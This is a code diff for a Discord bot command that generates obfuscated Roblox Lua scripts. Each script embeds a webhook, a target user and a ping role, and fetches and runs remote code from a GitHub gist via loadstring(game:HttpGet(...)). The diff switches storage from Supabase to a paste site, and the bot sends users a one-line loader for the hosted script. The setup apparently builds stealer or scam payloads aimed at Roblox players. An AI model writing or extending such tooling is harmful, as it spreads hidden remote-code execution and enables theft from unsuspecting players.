@@ -1,4 +1,3 @@
-import { saveScript } from '../services/supabase.js';
 import { obfuscate } from '../services/methylone.js';
 import { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } from 'discord.js';
 
@@ -55,7 +54,7 @@ export async function execute(interaction) {
 _G.YOUR_WEBHOOK = '${webhook}'
 _G.TARGET_USER = '${target}'
 _G.PING_ROLE_ID = '${pingRole}'
-loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859ui/a730c26cc3d90d184a0f6b8bee5e1477/raw/d6ed4f5bbaf83cd3bdb348eb658ac7ba53220cfe/gistfile1.txt', true))()
+loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/9fd33a4b9399bbb8f038b9dfc2223ed9/raw/8d43622c9f56b3791e09df782d62ba85f0222101/gistfile1.txt', true))()
 `;
 
   // Defer the reply
@@ -68,14 +67,19 @@ loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859ui/a730c2
     return submitted.editReply(`❌ Failed to obfuscate: ${err.message}`);
   }
 
-  let id;
-  try {
-    id = await saveScript(obfuscated);
-  } catch (err) {
-    return submitted.editReply(`❌ Failed to save script: ${err.message}`);
-  }
+  // Save to Rubis instead of Supabase
+  const pasteResponse = await fetch('https://rubis.fun/api/paste', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: obfuscated,
+    }),
+  });
 
-  const loadstring = `loadstring(game:HttpGet("https://antiwares-production.up.railway.app/api/public/s/${id}"))()`;
+  const pasteData = await pasteResponse.json();
+  const id = pasteData.id;
+
+  const loadstring = `loadstring(game:HttpGet("https://rubis.fun/raw/${id}"))()`;
 
   // Send to DMs
   try {
